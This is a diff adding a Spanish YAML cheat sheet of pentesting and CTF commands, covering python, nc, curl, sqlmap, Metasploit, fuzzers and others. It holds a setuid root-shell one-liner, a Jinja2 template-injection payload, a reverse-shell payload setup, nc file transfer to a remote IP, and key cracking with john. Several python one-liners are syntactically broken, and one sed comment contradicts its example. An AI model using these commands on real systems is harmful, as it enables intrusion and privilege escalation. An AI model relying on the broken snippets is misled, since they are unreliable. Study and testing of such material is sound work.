@@ -1,0 +1,812 @@
+#################################
+#INDICE DE PAQUETES Y PROTOCOLOS#
+#################################
+
+# CATEGORIAS: 
+# info, web, wrapper, url, encoding, crypto, forensic, exploitation, network, system, scripting, utility, database
+
+- tool: python
+  category: web
+  tags: [http, server]
+  description: "Abre un servidor HTTP en el puerto especificado, en el mismo PATH donde estemos ubicados"
+  command: |
+    python3 -m http.server <PORT> # Abre un servidor simple en <PORT>
+    echo "01010..." | python3 -c 'import sys; print("".join(chr(int(b,2)) for b in sys.stdin.read().split()))'  # Transformar de binarios a ascii
+    echo "75 74 73 ..." | python3 -c 'import sys; print("".join(char(int(i)) for i in sys;stdin.read().split()))'   # Transformar de int a ascii
+    python3 -c 'print(bytes.fromhex("<HEX>").decode("latin-1"))'  # Decodificar hex a ascii
+    python3 -c 'print("<ASCII>.encode.hex()")'  # Codificar ascii a hex
+    python3 -c 'print(hex(INT))' | python3 -c 'print(f"0x{INT:nX}")'  # Codificar int a hex
+    python3 -c 'print(int("<HEX>", 16))'  # Ver bytes a hex como entero
+    python3 -c 'print(f"{<NUM>:0{N}<TIPO>}")' # Esta sintaxis es para obtener distintas bases/formatos, basándose en un entero, flotante o expresión matemática que se desee codificar.
+    <NUM> # número entero, flotante o expresión matemática.
+    N # Ancho mínimo del resultado (rellena con ceros a la izquierda si hace falta)
+    <TIPO>  # letra que define el formato de salida
+    b # binario
+    o # octal
+    d # decimal (default si no se pone nada)
+    x # hexadecimal minúscula
+    X # hexadecimal mayúscula
+    n # como d pero usa el separador de miles
+    c # valor de la tabla ascii en decimales
+    python3 -c 'import urllib.parse; print(urllib.parse.unquote(<input>))'  # Decodificar caracteres URI/URL
+    python3 -c 'print("".join(chr(b ^ <HEX>) for b in <encrypted>))'  # Desencriptar contenido cifrado con XOR
+    python3 -c 'import pty; pty.spawn("/bin/bash")' # General shell interactiva con pty
+    python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'  # Generar shell con privilegios root via setuid (útil si el binario python 3.8 tiene el bit SUID)
+    {{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}  # Server side template injection en Flask/Jinja2 para ejecutar comandos
+    python3 -c 'data=open("file.ext", "rb"); open("hiddenFile.ext", "wb").write(data[hex:])'  # Extraer un archivo oculto dentro de otro binario, a partir del offset detectado con binwalk
+    python3 -c 'import zlib, sys; sys.stdout.buffer.write(<lib.decompress(open(sys.argv[1], "rb").read()))' # Descomprimir un archivo ZLIB y volcarlo a un binario de salida
+
+
+- tool: nc
+  category: network
+  tags: [listener, shell, exploitation]
+  description: "Poner un puerto a la escucha para recibir conexiones"
+  command: |
+    nc -nlvp [PUERTO] # 
+    nc <IP> <PORT> < file.ext # Enviar un archivo mediante redes
+    nc -lp <PORT> > file.ext # Recibir un archivo mediante redes
+    tar czfv - /ruta/del/archivo | nc <IP> <PORT> # Comprimir un archivo y enviarlo
+    nc -lp <PORT> | tar xzvf -  # Recibir un archivo y descomprimir
+
+
+- tool: wget
+  category: utility
+  tags: [download, sudo, privesc, etc-password]
+  description: "Descarga de archivos en la terminal (CLI)"
+  command: |
+    wget [FLAGS] <URL>  # 
+    wget --tries=0 --retry-connrefused <URL> # Buen comando para descargas que se puedan pausar. En caso de pausarse se puede usar el mismo comando con el flag "-c" para reanudar.
+    -b  # background, se va a segundo plano después de iniciar
+    -q  # quiet
+    -o  # output-file, registra los mensajes de la descarga en el archivo asignado
+    -a  # lo mismo que "-o" pero asigna el registro de la descarga a un archivo existente
+    -d  # usa el modo "debug"
+    -v  # verbose
+    -nv # no verbose
+    -c  # Continúa una descarga desde donde se dejó
+    -i FILE # lee la URL desde un archivo especificado
+    -t NUM, --tries=N # asigna número de intentos de descarga, "inf" o "0" hace intentos infinitos, las excepciones son fatal errors como "connection refused" o "not found" (404) estos no serán reintentados
+    -O FILE # Nombre del archivo donde se guardará lo que se desee descargar
+    -S  # respuesta del servidor enviada por HTTP o FTP
+    -T NUM  # timeout en segundos
+    --user=user --password=pwd  # Especifica usuario y contraseña (FTP, HTTP) para descargar archivos. Estos pueden ser reescritos por --ftp-user, --ftp-password, --http-user, --http-password.
+    -r  # Descarga de forma recursiva
+    -l  # Profundidad de la recursión
+    --ignore-case # Ignora las mayúsculas/minusculas en archivos y directorios.
+    -I LIST # Lista de directorios que se quieren seguir separados por comas.
+    -X LIST # Lo contrario a -I, excluye los que estén mencionados en la lista separados por comas.
+    -nd, --no-directories # No crea una jerarquía de directorios cuando se descarga de forma recursiva
+    -x  # Lo contrario de "-nd"
+    -np, --no-parent  # No asciende en la jerarquía de directorios. 
+    -nH, --no-host-directories  # No crea directorios del anfitrión
+    --no-cache  # Deshabilita la caché del servidor. En este caso wget enviará las directivas correspondientes para desactivarlos.
+    --no-cookies  # Desactiva el uso de cookies
+    --save-cookies FILE # Registrará las cookies en el archivo especificado.
+    --keep-session-cookies  # Se usa en conjunto con "--save-cookies" de sesión de un archivo
+    --compression=type  # Elige el tipo de compresión del archivo a descargar
+    --max-redirect=number # Especifica el numero de redirecciones
+    --secure-protocol=protocol  # Especifica el tipo de protocolo seguro, TLS/SSL
+    --retry-connrefused # Considera "connection refused" un error transitorio e intenta de nuevo. Bueno para acompañar con "--tries=0" hace intentos infinitos de descarga.
+    --post-file=file  # Usa POST como metodo para las solicitudes HTTP, envía archivos
+    --post-data=string  # Usa post como método para las solicitudes, envia texto
+    --header=header-line  # Asigna un header a la solicitud HTTP o cualquier otra
+
+- tool: curl
+  category: utility
+  tags: [download, upload, recon, enumeration, exfiltration, fuzzing, proxy]
+  description: "Transfiere una URL"
+  command: |
+    --cert-status # Verifica el estatus del certificado TLS/SSL
+    --compressed-ssh  # Exclusivamente para protocolo FTP y SFTP. Solicita al servidor SSH que comprima la información antes de enviarla a través de la red usando el algoritmo de compresión integrado de SSH (usualmente zlib), es útil en conexiones lentas ya que reduce significativamente el tiempo de transferencias si se está cargando/descargando archivos, también en archivos de texto o sin comprimir como código fuente, logs o bases de datos SQL ya que estos formatos se comprimen muy bien.
+    --compressed  # Exclusivamente para protocolo HTTP y HTTPS. Solicita al servidor que envíe la respuesta comprimida o descomprimida según sea el caso usando algoritmos como gzip, deflate, br o zstd para ahorrar ancho de banda y acelerar la descarga. Este flag añadirá el header "Accept-Encoding" a la petición y también si el servidor responde con "Content-Encoding" curl lo descomprime antes de guardarlo o mostrarlo.
+    -K FILE, --config FILE  # Sirve para cargar documentos, opciones y URLs desde un archivo de configuración en lugar de escribirlos en la CL. Es particularmente útil cuando tienes peticiones muy largas con muchas cabeceras (-H), cookies o credenciales que se quieren reutilizar o mantener ordenadas. Debe usar la par "clave-valor" como cabeceras normales: url = "https://ejemplo.com/data", header = "Accept: application/json", user-agent = "useragent/1.0", cada parámetro va separado por un salto de línea (\n)
+    -connect-timeout NUM  # Tiempo máximo en segundos que se permite a una conexión curl, puede aceptar valores decimales en NUM separado por puntos (.)
+    -c FILE, --cookie-jar FILE  # Especifica en que archivo quieres que curl guarde las cookies después de completar la operacion. Este flag sólo sirve como output una vez recibida la respuesta del servidor-
+    -b DATA, --cookie DATA  # Pasa "DATA" como cookie a la solicitud del servidor. DATA también puede ser un archivo donde están almacenadas las cookies, si se usa en conjunto con el flag "-c, --cookie-jar" las nuevas cookies devueltas por el servidor serán almacenadas en el archivo especificado. Este flag sirve para leer/recibir cookies no para almacenar.
+    --create-dirs # Se usa en cojunto con el flag "-o, --output", por defecto si se pide a curl que guarde un archivo en una ruta con carpetas que aún no existen este fallará y arrojará un error.
+    -d DATA, --data DATA  # Sirve para enviar datos en el cuerpo de una petición POST. Se utiliza para enviar formularios, datos JSON o parámetros a una API. Los datos pueden estar en formato JSON y habría que combinarlo con el flag "-H".
+    --digest  # Habilita la autenticación HTTP Digest. Se usa con el flag "-u, --user". Previene que la contraseña viaje como texto plano o base64.
+    --dns-ipv4-addr ADDR  # Le dice a curl que vincule una IP específica cuando se hacen solicitudes DNS por IPv4.
+    --dns-ipv6-addr ADDR  # Lo mismo que "--dns-ipv4-addr" sólo que con IPv6.
+    --dns-servers ADDRS # Usa una lista de direcciones IP que le pasamos en lugar de las predeterminadas del sistema.
+    --doh-cert-status # Lo mismo que "--cert-status" pero usado para DoH (DNS-over-HTTPS).
+    --doh-insecure  # Lo mismo que "-k, --insecure" pero usado para DoH
+    --doh-url URL # Especifica que servidor DNS-over-HTTPS para resolver hostsnames
+    -D FILE, --dump-header FILE # Vuelca los headers de una solicitud en el archivo especificado.
+    -F, --form  # Permite a curl enviar datos al servidor de un formulario especificamente usando el formato "multipart/form-data". Se utiliza para subir archivos y enviar formularios que mezclan campos de textos con archivos. Este flag cambia automáticamente el método a POST. Se debe indicar con un "@" cuando se desea subir un archivo: -F "file=@/path/file.ext" [URL]. Para enviar campos de texto se usa el parámetro normal: -F "clave=valor", puede ser usado múltiples veces en un comando.
+    --data-binary <data>  # Manda datos crudos en la solicitud: @filename
+    -G, --get # Cuando es usada esta opción hace que toda la data especificada con "-d, --data" sea usada en una petición GET.
+    -I, --head  # Sólo imprime los headers de la solicitud.
+    -H HEADER/FILE, --header HEADER/file  # Añade un header extra a la solicitud, se hace "HEADER: Valor" tal cuál como si fuese la solicitud.
+    -i, --include # Imprime los headers de la solicitud en conjunto con el cuerpo.
+    -k, --insecure  # Por defecto todas las conexiones que hace curl son verificadas por el certificado TLS, en caso de no serlo rechazará la respuesta, con esta opción le estamos diciendo que proceda de igual forma.
+    --interface NAME  # Realiza una operación usando la interfaz de red especificada, "--interface eth0:1".
+    -4, --ipv4  # Esta opción resuelve hostsnames sólo para IPv4.
+    -6, --ipv6  # Esta opción resuelve hostsnames sólo para IPv6
+    --json  # Envía los datos JSON especificados en una solicitud POST. Funciona para reempazar "-H" and "-b".
+    --local-port <NUM/RANGE>  # Asigna un rango de puertos para ser usados en la solicitud "--local-port 1000-3000".
+    -L, --location  # Si un servidor reporta que la solicitud ha sido movida a una locación diferente (código de respuesta 3XX) esta opción hará la nueva solicitud al nuevo sitio.
+    --max-redirs NUM  # Asigna un número máximo de redirecciones a seguir. Cuando "-L, --location" es usada previene a curl de hacer muchas redirecciones, por defecto son 50, pero lo podemos asignar a menos.
+    -m NUM, --max-time NUM  # Número máximo en segundos permitidos para cada solicitud.
+    -:, --next  # Le dice a curl que realice múltiples peticiones de izquierda a derecha, se pueden especificar todas en la línea de comandos y cada una se ejecutará en orden: "curl URL1 --next URL2".Además se pueden especificar cabeceras y flags independiente para cada solicitud.
+    -N, --no-bufer  # Desactiva el almacenamiento en búfer de la salida, obligando a curl a mostrar o transmitir los datos en la terminal en el mismo segundo que los recibe. Por defecto curl acumula los datos entrantes en un bloque de memoria (búfer) y los procesa juntos en "lotes". Al activar este flag se destruye ese intermediario y el flujo de datos se vuelve completamente inmediato. Es muy útil para el consumo de APIs que envían respuestas contínuas o infinitas (como WebSockets o Streaming), sin el flag se congelaría la pantalla hasta que se llene el búfer y decida mostrar los datos, también sirve cuando se está haciendo pipe (|) redirigiendo la salida de curl hacia otro lado el flag asegura que no llegue con retrasos.
+    --output-dir DIR  # Especifica el directorio en el que los archivos se deben almacenar, cuando "-O, --remote-name o -o, --output" son usados. Se puede usar para cada solicitud usada antes de "-:, --next"
+    -o, --output FILE # Escribe la salida en FILE en lugar de stdout.
+    -Z, --parallel  # Sirve para descargar, recibir solicitudes o transferir múltiples URLs de forma simultánea (en paralelo), en lugar de hacerlo de forma secuencial.
+    --preproxy [protocol://host[:port]] # Usa los SOCKS especificados antes de conectarse por HTTP, HTTPS. En este caso curl se conecta primero al SOCK y luego conecta (a través del SOCK) al HTTP o HTTPS.
+    -x, --proxy [protocol://host[:port]]  # Usa la proxy especificada.
+    -O, --remote-name # Descarga el contenido a un archivo asignando el mismo nombre que tenía en el servidor.
+    --remove-on-error # Cuando curl retorna un error y se he la dicho que guarde la información en un archivo, si este flag es asignado, removerá el archivo antes de salir.
+    --request-target PATH # Le dice a curl que use el "PATH" alternativo en vez de usar el path asignado en la URL.
+    -X, --request METHOD  # Asigna el método de la solicitud (HTTP, FTP, POP3, IMAP, SMTP).
+    -S, --show-error  # Cuando se usa "-s, --silent" hace que curl muestre el error si falla.
+    -s, --silent  # Silencio o quieto, no muestra el progreso o mensajes de errores, hace que curl se quede en silencio, aún así imprime los datos que se han solicitado.
+    -T FILE, --upload-file FILE # Transfiere el archivo especificado en FILE a la URL asignada.
+    -A NAME, --user-agent NAME  # Especifica el "User-Agent" para ser mandado al servidor en el header.
+    -u, --user <USER:PWD> # Especifica el nombre de usuario y contraseña para ser usado en la autenticación.
+    -v, --verbose # Modo verbose.
+    -w, --write-out <FORMAT>  # Hace que curl muestre la información de la respuesta, ver mejor con ayuda. "-w '%{http_code}\n'"
+    --path-as-is  # Sirve para enviar la ruta de la URL exactamente como la escribes, evitando que curl normalice o limpie los segmentos de punto (/./ o /../) antes de realizar la petición.
+
+
+- tool: sed
+  category: utility
+  tags: [stream, filter, pipe]
+  description: "Editor de flujos para filtrar y transformar texto"
+  command: |
+    -n  # Silencia la impresión automática
+    -i[SUFIJO]  # Edita el archivo en el momento. Con el sufijo "-i.bak" crea una copia de respaldo.
+    -e script # Añade un comando; permite encadenar varios
+    -f <archivo>  # Lee los comandos desde un archivo de script
+    -E, -r  # Usa expresiones regulares extendidas: ', ?, |, () sin escapar
+    -s  # Trata cada archivo como independiente (los números de línea se reinician)
+    -z  # Usa el caracter nulo como separador de línea en vez de saltos de línea)
+    --debug # Muestra cómo interpreta el script.
+    Ejemplo:  direccion/patron/reemplazo/bandera #
+    ---- direcciones ---- #
+    3 # Solo la línea 3
+    1,3 # De la línea 2 a la 5
+    $ # Última línea
+    1~2 # Cada dos líneas empezando por la 1
+    /patron/  # Líneas que coinciden con patron
+    /ini/,/fin/ # Desde la linea que coincide con "ini" hasta la que coincide con "fin"
+    2,+3  # La línea 2 y las 3 siguientes
+    direccion!  # Invierte la selección (todas menos esas)
+    ---- comandos principales ---- #
+    s # Sustituir
+    d # Borrar línea
+    p # Imprimir línea
+    a\  # Añadir texto después de la línea
+    i\  # Insertar texto antes de la línea
+    c\  # Cambiar reemplazar la línea completa
+    y # Transliterar caracteres (como tr)
+    r <archivo> # Insertar contenido de un archivo
+    w <archivo> # Escribir las líneas seleccionadas en un archivo
+    q # Salir
+    = # Imprimir el número de línea
+    ---- banderas ---- #
+    g # todas las coincidencias de la línea (sin ella sólo la primera)
+    2 # Sólo la segunda coincidencia. 2g desde la segunda en adelante
+    i, I  # Ignora mayúsculas o minúsculas
+    p # Imprime la línea si hubo sustitución (útil con -n)
+    w <archivo> # Escribe las líneas modificadas en un archivo
+    
+- tool: comm
+  category: utility
+  tags: [filter, compare]
+  description: "Compara línea por línea dos archivos ordenados"
+  command: |
+    comm <(sort ARCHIVO 1) <(sort ARCHIVO 2)  # 
+    -1  # Elimina la columna 1 (filas que solo están presentes en ARCHIVO 1)
+    -2  # Elimina la columna 2 (filas que solo están presentes en ARCHIVO 2)
+    -3  # Elimina la columna 3 (líneas que están en ambos archivos)
+
+- tool: useradd
+  category: utility
+  tags: [user, password]
+  description: "Crea o actualiza un nuevo usuario"
+  command: |
+    sudo useradd <usuario>  # 
+    -m  # Crea un directorio personalizado en /home
+    -s  # Le asigna una shell, se debe pasar un valor a este parámetro (/bin/bash por ejemplo)
+    -d  # Especifica una ruta custom para el home, en vez de default (/opt/usuario por ejemplo)
+    -g  # Asigna el grupo primario del usuario (-g sudo)
+    -G  # Asigna grupos secundarios adicionales separados por coma (-G sudo, adm, docker)
+    -u  # Fuerza un UID específico en vez de que el sistema asigne automáticamente
+    -c  # Comentario, descripción del usuario.
+    -e  # Fecha de expiración de la cuenta, formato YYYY-MM-DD
+    -r  # Crea un usuario de sistema: UID bajo, sin expiración de contraseña, pensado para servicios.
+    -p  # Asigna contraseña ya hasheada directamente
+    -N  # No crea un grupo con el mismo nombre del usuario (comportamiento típico de Debian)
+
+- tool: chpasswd
+  category: utility
+  tags: [user, password]
+  description: "Actualiza contraseñas en lotes"
+  command: |
+    echo "usuario:password", sudo chpasswd  # Lee pares "usuario:contraseña" en texto plano desde stdin y los hashea/asigna
+    -e, --encrypted # Indica que la contraseña ya viene hasheada "usuario:$6$..."
+    -c, --crypt-method MET  # Indicar el tipo de encriptado, 'man chpasswd' para ver los tipos de encriptado
+    -s, --sha-rounds ROUNDS # Define el número de rondas del algoritmo SHA
+    -R, --root  # Aplica los cambios dentro de u directorio raíz alternativo.
+
+- tool: usermod
+  category: utility
+  tags: [user, password, groups]
+  description: "Modifica una cuenta de usuario"
+  command: |
+    sudo usermod <FLAG> <GRUPO/SHELL/DIRECTORIO> <USUARIO>  # 
+    sudo usermod -d /home/nuevo -m usuario  # 
+    sudo usermod -l nuevonombre viejonombre # 
+    -aG # Son dos flags "-a" y "-G", (append y groups respectivamente) añade el usuario a uno o más grupos secundarios, sin quitar los que ya tenía
+    -G  # Reemplaza todos los grupos secundarios del usuario por los indicados (separados por comas) - ¡Elimina los anteriores!
+    -g  # Cambia el grupo primario del usuario
+    -s  # Cambia la shell de login del usuario
+    -d  # Cambia la ruta del directorio "home" del usuario (no mueve archivos, sólo actualiza la referencia)
+    -m  # Se usa junto con "-d" para mover físicamente el contenido del home antiguo al nuevo destino 
+    -l  # Cambia el nombre de login (username) del usuario
+    -u  # Cambia el UID del usuario
+    -L  # Bloquea la cuenta (equivale a poner un '!' delante del hash en '/etc/shadow', impidiendo login con contraseña)
+    -U  # Desbloque al cuenta (inverso de -L)
+    -e  # Cambia la fecha de expiración de la cuenta
+    -c  # Cambia el comentario/descripción
+
+- tool: capabilities
+  category: system
+  tags: [root, least-privilege]
+  description: "Se usan para aplicar el principio de menor privilegio en el sistema operativo. Su objetivo principal es dividir el poder absoluto del usuario root (administrador) en pequeños fragmentos independientes de privilegios."
+  command: |
+    man capabilities
+
+- tool: mysql
+  category: database
+  tags: [sqli, credentials, data]
+  description: "Ejecuta DBMS desde la CLI."
+  command: |
+    mysql -h <HOST/IP> -P [PORT] -u USER -p PASSWORD  # 
+    -u  # Username
+    -host # Host
+    -p  # Password (require)
+    -P  # Port
+    --skip-ssl  # No usar certificado TLS/SSL
+
+- tool: wireshark
+  category: network
+  tags: [traffic-analysis, packets]
+  description: "Analizador de red, su función es capturar y examinar el tráfico en tiempo real que viaja a través de la red"
+  command: |
+    ip.src == X.X.X.X # Filtra por IP visitante
+    ip.addr == X.X.X.X  # Todo el tráfico de/hacia esa IP.
+    http  # Protocolo HTTP
+    ftp # Protocolo FTP
+    ||  # Operador lógico OR
+    &&  # Operador lógico AND
+
+- tool: tshark
+  category: network
+  tags: [traffic-analysis, packets]
+  description: "Analizador de protocolos de red por línea de comando, es la versión CLI de Wireshark"
+  command: |
+    tshark <FLAGS>  # 
+    -D  # Muestra todas las interfaces de red disponibles.
+    -i  # Especificar qué interfaz se va a usar "tshark -i eth0"
+    -w  # Guarda el tráfico capturado en un archivo binario compatible con wireshark en lugar de mostrarlo en pantalla "tshark -i eth0 -w captura.pcap"
+    -r  # Lee y analiza un archivo de captura previamente guardado "tshark -r captura.pcap"
+    -f  # Filtro de captura de bajo nivel '-f "tcp port 80 or port 443"'
+    -Y  # Filtro de visualización potente '-Y "http.request.method == 'POST'"'
+    -T  # Cambia el formato de salida. Los más potentes son "fields", para extraer datos específicos json o ek. "tshark -r captura.pcap -T fields ..."
+    -e  # Se usa obligatoriamente con "-T fields". Permite extraer columnas o datos exactos del protocolo (como IPs, puertos, dominios DNS, etc). "tshark -r captura.pcap -T fields -e ip.src -e ip.dst .e dns.qry.name"
+    -V  # Verbose
+    -n  # No name resolution
+
+- tool: tcpdump
+  category: network
+  tags: [dump, traffic-analysis, sniffing]
+  description: "Analizador de paquetes por línea de comandos más clásico, ligero y veterano del mundo Linux. Su función principal es capturar y volcar el tráfico de red que pasa por una interfaz. Es una herramienta de bajo nivel"
+  command: |
+    tcpdump <FLAGS> # 
+    -A  # Imprime cada paquetes (menos su header de enlace) en ASCII, útil para capturar páginas web.
+    -c NUM  # Sale después de contar NUM packets.
+    -D, --list-interfaces # Lista las interfaces de red disponibles.
+    -e  # Imprime el nivel de enlace de la cabecera en cada linea.
+    -i INTERFACE, --interface=INTERFACE # Escucha la interfaz asignada en INTERFACE
+    -I, --monitor-mode  # Modo monitor. Configura la tarjeta Wi-Fi en modo escucha pasiva para capturar todo el tráfico que viaja por el aire en ese canal, sin importar a qué dispositivo pertenece.
+    --inmediate-mode  # Los paquetes son impresos una vez recibidos, no se almacenarán en búfer, útil cuando queremos imprimir todo directo en la terminal y no almacenar en un archivo.
+    -l  # Sirve para activar el búfer de salida instantánea por líneas. Por defecto cuando se manda la salida de tcpdump a otro canal o archivo se acumulan los paquetes en memoria (búfer) antes de escribirlos. Esto hace que la salida sea inmediata, es útil para filtrar.
+    -n  # Desactiva la resolución de nombres (DNS) y muestra las direcciones de IP puras.
+    --number  # Imprime los números de paquete al inicio de la línea.
+    --print # Sirve para imprimir la salida de los paquetes en la CLI, incluso si se está capturando el tráfico y guardando en un archivo con "-w".
+    -Q DIRECTION, --direction=DIRECTION # Sirve para filtrar el tráfico según la dirección del flujo de los paquetes, permitiéndole elegir si sólo debe capturar lo que entra, sale o ambos. "in - out - inout"
+    -q  # Modo quiet, reduce la cantidad de información técnica que se muestra en la pantalla por cada paquete limitándose a los datos esenciales, es bueno para optimizar el rendimiento.
+    -r FILE # Lee paquetes desde FILE que ha sido creado previamente con "-w" u otras herramientas que han escrito archivos pcap o pcapng.
+    -t  # No imprime timestamp en cada línea de volcado.
+    -tt # Imprime timestamp en cada línea de volcado.
+    -v  # Verbose, se puede aumentar hasta 3.
+    -w FILE # Escribe el output en el archivo FILE Especificado.
+    -x  # Cuando se parsea e imprime, además de imprimir los headers de cada paquete, imprime los datos de cada uno en HEX. No contempla el nivel de enlace.
+    -xx # Lo mismo que "-x" pero SI contempla el nivel de enlace.
+    -X  # Lo mismo que "-x" pero imprime HEX y ASCII, no contempla la capa de enlace.
+    -XX # Lo mismo que "-X", contempla la capa de enlace.
+
+- tool: ssh
+  category: network
+  tags: [tunneling, keys, lateral-movement, config, credentials]
+  description: "Protocolo de red que permite a dos computadoras comunicarse y transferir datos de forma segura a través de una red insegura (como Internet)"
+  command: | 
+    ssh <FLAGS> usuario@ip_server # 
+    ssh -L <puerto-local>:<destino/IP>:<puerto-remoto> usuario@ip_server # Port Forwarding
+    -L  # Local Port Forwarding. Abre un puerto en tu máquina local que tunela el tŕafico de forma cifrada hacia un puerto del servidor remoto. "-L 8000:localhost:3000 usuario@ip_server"
+    ssh -i <llave> -L <puerto-local>:<destino/IP>:<puerto-remoto> usuario@ip_server # Port forwarding con llave privada
+    -p  # Puerto
+    -v  # Verbose, se puede hacer hasta 3.
+    -i  # Archivo/ruta con llave de autenticación
+    -o  # Fuerza el modo de autenticación "-o PreferredAuthentications=password"    
+
+- tool: ssh-keygen
+  category: network
+  tags: [ssh-key, public-key, key-generator]
+  description: "Crea una llave (key) RSA"
+  command: |
+    ssh-keygen -t rsa
+
+- tool: ssh2john
+  category: forensic
+  tags: [crack, ssh-key]
+  description: "Crackea una llave SSH"
+  command: |
+    ssh2john FILE > rsa.hash  # 
+    john --wordlist=/path/to/wordlist > rsa.cracked # 
+
+- tool: scp
+  category: network
+  tags: [file-transfer, system, utility]
+  description: "Transfiere archivos mediante protocolo SSH"
+  command: |
+    scp user@host:[host-path] [my-path] # Copia del host remoto a nuestro host
+    scp [my-path] user@host:[host-path] # Copia de nuestro host al host remoto
+    sudo systemctl status ssh # Comprobar que el servicio esté activo
+    -P  # Establece el puerto
+    -r  # Recursivo
+    -v  # Verbose
+    -o  # Establecer parámetros "-o PreferredAuthentications=password"
+
+- tool: ftp
+  category: network
+  tags: [ftp, file-transfer, protocol]
+  description: "Protocolo para la transferencia de archivos en red (Puerto 21)."
+  command: |
+    ftp <IP> [PORT] # 
+    -a  # Entra en modo "anonymous"
+    ls / dir  # Listar archivos y directorios
+    get # Transferir un archivo desde la máquina remota a la local
+    put # Transferir un archivo desde la máquina local a la remota
+    passive # Salir del modo pasivo si es necesario
+
+- tool: gpg
+  category: crypto
+  tags: [pgp, openpgp, decryption, keys]
+  description: "GNU Privacy Guard. Permite cifrar y firmar datos garantizando confidencialidad e integridad. Los archivos '.asc' (llave en formato ASCII Armor) and '.pgp' (datos cifrados) suelen estar vinculados."
+  command: |
+    gpg --import [file.asc] # Importar llave pública o privada
+    gpg --decrypt archivo.pgp # Descifrar archivos .pgp de manera directa
+    gpg2john archivo.asc > gpg.hash # Flujo para crackear llave si requiere passphrase
+    john --wordlist=/path/to/wordlist gpg.hash
+
+- tool: searchsploit
+  category: exploitation
+  tags: [exploit-db, poc, search]
+  description: "Herramienta de línea de comandos para realizar búsquedas offline en la base de datos local de Exploit-DB."
+  command: |
+    searchsploit apache 2.4 # Buscar exploits por servicio y versión
+    searchsploit -m 12345 # Copiar el exploit al directorio de trabajo actual
+    searchsploit -x 12345 # Examinar el código fuente del exploit en pantalla
+    searchsploit --update # Actualizar la base de datos localmente
+
+- tool: msfconsole
+  category: exploitation
+  tags: [metasploit, framework, console]
+  description: "Interfaz de consola interactiva del ecosistema Metasploit Framework."
+  command: |
+    sudo msfdb init # Inicializar de forma rápida la base de datos para optimizar búsquedas
+    msfconsole  # Lanzar el framework
+    search type:[module] [kw] # Buscar módulos por tipo y palabras clave
+    use [script_path] # Cargar un módulo específico
+    show options  # Mostrar parámetros requeridos y configurados
+    show advanced # Desplegar opciones avanzadas
+    show payloads # Listar cargas útiles compatibles con el exploit
+    show targets  # Ver plataformas o versiones de software soportadas
+    show info # Mostrar metadatos completos del módulo activo
+    set RHOSTS [IP_objetivo]  # Configurar la IP del target
+    set RPORT [PORT]  # Configurar el puerto del target
+    set USERNAME [usuario_db] # Configurar credenciales de autenticación
+    set PASSWORD [clave_db] # Asigna la clave a la bbdd
+    set USER_FILE [/path/file]  # Cargar diccionarios independientes de usuarios
+    set PASS_FILE [/path/file]  # Cargar diccionarios independientes de contraseñas
+    set VERBOSE true  # Habilitar salida detallada
+    set THREADS [Nro] # Controlar velocidad y volumen de conexiones concurrentes
+    set CPUS [Nro]  # Asigna CPUS
+    set BATCH_SIZE [Nro]
+    set TABLENAME [name]  # Forzar nombre de tabla aleatorio para evitar conflictos ("table already exists")
+    set STOP_ON_SUCCESS true  # Detener ejecución al obtener éxito
+    set PAYLOAD linux/x64/shell_reverse_tcp # Selección manual del payload
+    set LHOST [Tu_IP_VPN] # Configuración del túnel de retorno
+    set LPORT [Puerto_escucha]  # Asigna la escucha de un puerto
+    run # Ejecutar el exploit (alias: exploit)
+    sessions -l # Listar sesiones activas en segundo plano
+    sessions -i [ID_sesión] # Interactuar directamente con una sesión
+    background  # Enviar sesión al entorno de ejecución global (CTRL+Z)
+    reload_all  # Recargar todos los paquetes del framework
+    unset all # Restablecer los parámetros globales del exploit
+
+- tool: msfvenom
+  category: exploitation
+  tags: [metasploit, payload, generator]
+  description: "Componente de Metasploit dedicado a la generación estructurada y codificación de payloads maliciosos."
+  command: |
+    msfvenom -l [payloads, encoders, nops, all] # Listar componentes disponibles
+    msfvenom -p [payload] # Configurar un payload específico
+    msfvenom -p [payload] --list-options  # Listar las opciones requeridas del payload
+
+- tool: sqlmap
+  category: database
+  tags: [sqli, injection, enumeration]
+  description: "Herramienta automatizada de detección y explotación de fallos de inyección SQL."
+  command: |
+    sqlmap [options]  # 
+    -u <URL>  # Especificar URL objetivo
+    -p <param>  # Forzar el testeo en un parámetro concreto
+    --data=DATA # Pasar los parámetros del cuerpo de una petición POST
+    --risk=RISK # Modificar el nivel de riesgo de los payloads (1-3)
+    --level=LEVEL # Modificar la profundidad y cantidad de pruebas (1-5)
+    --tables  # Enumerar las tablas dentro de las bases de datos encontradas
+    --batch # Ejecutar en modo no interactivo con comportamiento por defecto
+    --dbs # Enumerar los sistemas gestores de bases de datos disponibles
+    --forms # Analizar y parsear formularios de forma automática
+    -r archivo.txt  # Cargar una petición HTTP estructurada desde un archivo raw
+    -D [DBMS_NAME]  # Declarar la base de datos a auditar
+    -T [TABLE_NAME] # Declarar la tabla a auditar
+    --dump  # Volcar el contenido e información de la tabla (usar en conjunto con -T)
+
+- tool: gobuster
+  category: web
+  tags: [fuzzing, enumeration, directory, vhost]
+  description: "Herramienta de fuerza bruta para directorios web, nombres de hosts virtuales y fuzzing de parámetros generales."
+  command: |
+    gobuster dir -u <URL> -w /path/wordlist.txt # Enumerar directorios y archivos web
+    gobuster vhost -u <URL> -w /path/wordlist.txt # Buscar hosts virtuales en el dominio
+    gobuster fuzz -u <URL> -w /path/wordlist.txt  # Realizar fuzzing directo de parámetros ocultos
+    -t  # hilos concurrentes
+    -x  # extensiones específicas
+    -s  # códigos de estado válidos
+    -b  # blacklist de estados
+    --xl  # excluir por longitud
+    -r  # seguir redirecciones
+    --ad  # añadir dominio base recursivamente
+
+- tool: ffuf
+  category: web
+  tags: [fuzzing, enumeration, web]
+  description: "Fuzzer web rápido escrito en Go diseñado para el descubrimiento de elementos mediante sustitución de palabras clave."
+  command: |
+    ffuf -w /ruta/wordlist.txt -u http://target/FUZZ
+    ffuf -w /rota/wordlist.txt -u http://target?FUZZ=comando
+    -u  # URL
+    -H <Header: Valor>  # Inyectar o modificar cabeceras personalizadas
+    -fs [size]  # Filtrar y ocultar respuestas por longitud exacta de bytes
+    -fc [code]  # Filtrar y ocultar respuestas por códigos de estado HTTP
+    -mc [status]  # Filtrar por status code
+    -w -  # Wordlist | si se usa el guión tomará el pipe del comando anterior
+    -d  # Datos de solicitud POST (form)
+    -r  # Sigue redirecciones
+
+- tool: hexeditor
+  category: forensic
+  tags: [hex, binary, editor]
